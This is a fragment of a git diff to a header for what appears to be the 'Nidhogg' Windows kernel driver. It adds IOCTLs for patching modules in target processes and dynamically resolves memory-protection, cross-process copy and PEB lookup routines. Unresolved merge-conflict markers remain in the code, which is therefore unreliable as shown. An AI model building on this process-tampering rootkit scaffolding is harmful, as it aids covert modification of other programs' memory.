@@ -53,10 +53,14 @@
 >>>>>>> ffc9bcf (Seperated hidden and protected registry items.)
 =======
 
+<<<<<<< HEAD
 #define IOCTL_NIDHOGG_GLOBAL_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_GLOBAL_UNPATCH_MODULE CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
 >>>>>>> 9da4d60 (Added function documentation, refactored code)
+=======
+#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> b431e45 (First failed attempt)
 // *****************************************************************************************************
 
 #define MAX_PATCHED_MODULES 256
@@ -75,6 +79,7 @@ void ClearAll();
 
 typedef NTSTATUS(NTAPI* tZwProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, SIZE_T* NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
 typedef NTSTATUS(NTAPI* tMmCopyVirtualMemory)(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
+typedef PPEB(NTAPI* tPsGetProcessPeb)(PEPROCESS Process);
 
 // Globals.
 PVOID registrationHandle = NULL;
@@ -82,6 +87,7 @@ PVOID registrationHandle = NULL;
 struct DynamicImportedModulesGlobal {
 	tZwProtectVirtualMemory ZwProtectVirtualMemory;
 	tMmCopyVirtualMemory	MmCopyVirtualMemory;
+	tPsGetProcessPeb		PsGetProcessPeb;
 
 	void Init() {
 		UNICODE_STRING routineName;
@@ -89,31 +95,18 @@ struct DynamicImportedModulesGlobal {
 		ZwProtectVirtualMemory = (tZwProtectVirtualMemory)MmGetSystemRoutineAddress(&routineName);
 		RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
 		MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
+		RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
+		PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
 	}
 };
 DynamicImportedModulesGlobal dimGlobals;
 
 struct PatchedModule {
-	PUCHAR Patch;
+	ULONG Pid;
+	CHAR* Patch;
 	CHAR* FunctionName;
 	WCHAR* ModuleName;
 };
-
-struct PatchedModulesList {
-	int PatchedModulesCount;
-	PatchedModule Modules[MAX_PATCHED_MODULES];
-};
-
-struct PatchedModulesGlobal {
-	PatchedModulesList ModulesList;
-	FastMutex Lock;
-
-	void Init() {
-		ModulesList.PatchedModulesCount = 0;
-		Lock.Init();
-	}
-};
-PatchedModulesGlobal pmGlobals;
 
 struct ProcessesList {
 	int PidsCount;
